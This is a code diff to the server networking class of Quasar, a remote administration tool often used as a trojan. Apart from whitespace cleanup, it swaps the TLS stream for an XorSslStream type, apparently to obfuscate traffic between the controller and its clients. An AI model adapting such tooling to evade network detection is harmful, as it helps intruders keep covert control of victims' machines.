@@ -1,5 +1,6 @@
 ﻿using Quasar.Common.Messages;
 using Quasar.Common.Networking;
+using Quasar.Common.Streams;
 using System;
 using System.Collections.Generic;
 using System.Net;
@@ -131,7 +132,7 @@ namespace Quasar.Server.Networking
         public override int GetHashCode()
         {
             return this.EndPoint.GetHashCode();
-        }  
+        }
 
         /// <summary>
         /// The type of the message received.
@@ -145,7 +146,7 @@ namespace Quasar.Server.Networking
         /// <summary>
         /// The stream used for communication.
         /// </summary>
-        private readonly SslStream _stream;
+        private readonly XorSslStream _stream;
 
         /// <summary>
         /// The buffer pool to hold the receive-buffers for the clients.
@@ -184,6 +185,7 @@ namespace Quasar.Server.Networking
 
         // receive info
         private int _readOffset;
+
         private int _writeOffset;
         private int _readableDataLen;
         private int _payloadLen;
@@ -239,7 +241,7 @@ namespace Quasar.Server.Networking
         /// </summary>
         private readonly Mutex _singleWriteMutex = new Mutex();
 
-        public Client(BufferPool bufferPool, SslStream stream, IPEndPoint endPoint)
+        public Client(BufferPool bufferPool, XorSslStream stream, IPEndPoint endPoint)
         {
             try
             {
@@ -406,9 +408,9 @@ namespace Quasar.Server.Networking
                         case ReceiveType.Payload:
                             {
                                 int length = (_writeOffset - HeaderSize + _readableDataLen) >= _payloadLen
-                                    ?  _payloadLen - (_writeOffset - HeaderSize)
+                                    ? _payloadLen - (_writeOffset - HeaderSize)
                                     : _readableDataLen;
-                                
+
                                 try
                                 {
                                     Array.Copy(readBuffer, _readOffset, _payloadBuffer, _writeOffset, length);
@@ -419,11 +421,11 @@ namespace Quasar.Server.Networking
                                     Disconnect();
                                     break;
                                 }
-                                
+
                                 _writeOffset += length;
                                 _readOffset += length;
                                 _readableDataLen -= length;
-                                
+
                                 if (_writeOffset - HeaderSize == _payloadLen)
                                 {
                                     // completely received payload
@@ -442,7 +444,7 @@ namespace Quasar.Server.Networking
                                         Disconnect();
                                         break;
                                     }
-                                    
+
                                     _receiveState = ReceiveType.Header;
                                     _payloadLen = 0;
                                     _writeOffset = 0;
